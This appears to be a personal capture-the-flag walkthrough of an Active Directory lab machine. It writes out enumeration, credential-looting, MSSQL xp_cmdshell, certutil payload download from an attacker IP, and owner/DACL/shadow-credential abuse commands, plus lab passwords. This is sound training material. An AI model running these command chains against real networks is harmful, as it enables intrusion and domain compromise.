

![[Pasted image 20250616230815.png]]

# Given Credentials:


rose:KxEPkKe6R8su


# 1. Nmap: 
-> I always want to start here to see what ports are open and what services are running.

Lets start with a basic scan and see what we can find:
`sudo nmap -sV -sC 10.10.11.51 -oN nmap.basic`

When that scan is done I want to do a deeper scan and run that while I do other tasks.

`sudo nmap -p- -sV -sC --script=default,vuln,exploit -T4 -oN nmap.full 10.10.11.51`

==Try to find valid users with nmap==: 
`sudo nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='sequel.htb',userdb=/usr/share/wordlists/statistically-likely-usernames/us-census-base-lists/j.smith-x98800.txt 10.10.11.51`

Some output from the scan:

1. DNS: DC01.sequel.htb0
2. LDAP and smb in use

![[Pasted image 20250615172520.png]]

## What to try?
1. Null session on SMB?
	1. `rpcclient -U "" -N <target_ip> `
		1. ^^ nothing here either
	2. `smbmap -u "" -p "" -P 445 -H 10.10.11.51 && smbmap -u "guest" -p "" -P 445 -H 10.10.11.51`
		1. ^^ nuthin
2. Null session on LDAP?
	1. `ldapsearch -x -H ldap://10.10.11.51:389 -b "dc=DC01.sequel,dc=htb" "(objectClass=user)"`
	2. ^^ Got nothing here
3. User enumeration with kerbrute?

# enum4linux:
`enum4linux -a 10.10.11.35`

==Usernames:== administrator, guest, krbtgt, domain admins, root, bin

not much more than that.


# With the given credentials (*sigh* did not realize) smbmap:
`smbmap -H 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --no-banner`

![[Pasted image 20250615180030.png]]

Let's look into the shares `Users` and `Accounting Department`

These files are on the accounting share: 
![[Pasted image 20250615180459.png]]

What do they have in them?

Likeley username: `ruy.fernandez` or `rfernandez`

==In a shared xml file there are usernames and creds==

```
rose:KxEPkKe6R8su
angela:0fwz7Q4mSpurIt99
Oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
ryan:WqSZAF6CysDQbGb3
sql_svc:WqSZAF6CysDQbGb3
```


## Enumerate users further: 
`python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py sequel.htb/"oscar":"86LxLBMgEWaKUnBG" -dc-ip 10.10.11.51 -all`

![[Pasted image 20250615183434.png]]

GROUPS:
![[Pasted image 20250615183638.png]]

Cloneable Domain Controllers??


## evil-winrm:
`evil-winrm -i 10.10.11.51 -u oscar -p '86LxLBMgEWaKUnBG'`

^^ nope

## Let's try to get a session on the sqlserver:
`python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/sa@10.10.11.51`

`EXEC xp_cmdshell 'whoami /priv'`

![[Pasted image 20250616221154.png]]

Ryan is part of the remote management users

==NTUSER.DAT== is accessible from the sql user:
![[Pasted image 20250616222424.png]]

## Let's get a reverse shell using revshells.com: https://www.revshells.com/


==We have some interesting files here==:
![[Pasted image 20250616231857.png]]


### Note: Screeshots are saved here: "/home/david/.cache/thumbnails/normal/"

==In the `sql-configuration.INI` file there are creds for the `sql_svc` account==:  
![[Pasted image 20250618221317.png]]

sql_svc:WqSZAF6CysDQbGb3

```shell
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/sql_svc@10.10.11.51 -windows-auth

# Don't forget -windows-auth!

```

## Ryan reused his credentials from `sql_svc!

ryan:WqSZAF6CysDQbGb3

^^ This allows us to get the user flag

## Get Winpeas on the machine:
`certutil -urlcache -split -f http://10.10.16.2/winPEASx64.exe C:\Users\Public\winpeasx64.exe
`

![[Pasted image 20250618225114.png]]

==SharpHound.exe location:== /opt/redteam/BloodHound-win32-x64/resources/app/Collectors/SharpHound.exe

Ran sharphound and transferred it back to my attacker machine with `download` from winrm

neo4j password: neo4j:david

bloodhound password: Sc458849282!

# Ryan has `writeOwner` on ca_svc:

^^ Which means we can conduct Resource-Based Constrained Delegation (RBCD)
![[Pasted image 20250619230802.png]]
## Plan of attack on above:
- Utilize Resource-Based Constrained Delegation to take control of ca_svc
```shell

python3 /usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
# Make Ryan the owner of the object

sudo python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
# Gain full control

sudo python3 /opt/redteam/pywhisker/pywhisker/pywhisker.py -d sequel.htb -u ryan -p  'WqSZAF6CysDQbGb3' --target "CA_SVC" --action "add" --filename CACert --export PEM   
# add a certificate


# THIS MUST BE RUN IN A VIRTUAL ENVIRONMENT
python3 gettgtpkinit.py -cert-pem /opt/redteam/pywhisker/pywhisker/CACert_cert.pem -key-pem /opt/redteam/pywhisker/pywhisker/CACert_priv.pem sequel.htb/ca_svc ca_svc.ccache
# Request the certificate

```

==Now we have a valid TGT==
![[Pasted image 20250620213848.png]]



ca_svc is a member of CERT_PUBLISHERS
![[Pasted image 20250619230847.png]]


HOW TO START A VIRTUAL ENVIRONMENT:
1. python3 -m venv venv
2. source venv/bin/activate
